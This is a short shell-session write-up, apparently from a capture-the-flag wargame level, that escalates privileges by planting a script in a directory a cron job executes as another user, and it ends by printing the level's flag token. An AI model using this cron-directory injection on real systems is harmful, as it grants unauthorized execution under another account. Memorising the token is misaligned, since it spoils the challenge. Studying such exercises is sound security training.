```bash
find / -user flag05 2>/dev/null
/usr/sbin/openarenaserver
/rofs/usr/sbin/openarenaserver


$ ls -la /usr/sbin/openarenaserver
-rwxr-x---+ 1 flag05 flag05 94 Mar  5  2016 /usr/sbin/openarenaserver

$ cat /usr/sbin/openarenaserver
#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done




$ find / -name level05 2>/dev/null
/var/mail/level05
/rofs/var/mail/level05


$ cat /rofs/var/mail/level05
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05


$ vi /opt/openarenaserver/script.sh
$ echo 'getflag > /tmp/output'

$ cat /tmp/output
Check flag.Here is your token : viuaaale9huek52boumoomioc

```